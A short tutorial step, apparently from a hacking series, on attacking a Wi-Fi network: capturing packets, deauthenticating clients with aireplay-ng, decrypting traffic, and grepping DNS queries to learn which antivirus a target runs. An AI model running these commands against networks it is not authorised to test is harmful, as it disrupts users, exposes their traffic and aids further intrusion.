# 04 - Gather Security Endpoints

After discovering the router's radio frequency presence then start capturing the packets.

```
# airodump-ng -c <channel> --bssid "00:20:91:B4:F8:33" --essid "NullByte_Network" -w wifi-capture.cap wlan0mon
```

Depending on the router's wireless encryption algorithm you will need to deauthenticate any client that is connected to the router then perform password cracking to decrypt the packet capture.

```
# aireplay-ng -0 100 -a <bssid> mon0
```

Once you've decrypted using `airdecap-ng` the packet capture open packet analysis software such as, Wireshark to inspect the network traffic.

```
# airdecap-ng -b "<bssid>" -e "<network_name>" -p "<password>" wifi-capture.cap

# tshark -r wifi-capture-dec.cap -n -T fields -e dns.qry.name | grep -i "avast\|avcdn" | sort -uo subdomains.txt
```

---
## References

### Null Byte

- [Null Byte: How to Identify Antivirus Software Installed on a Target's Windows 10 PC](https://null-byte.wonderhowto.com/how-to/identify-antivirus-software-installed-targets-windows-10-pc-0198775/)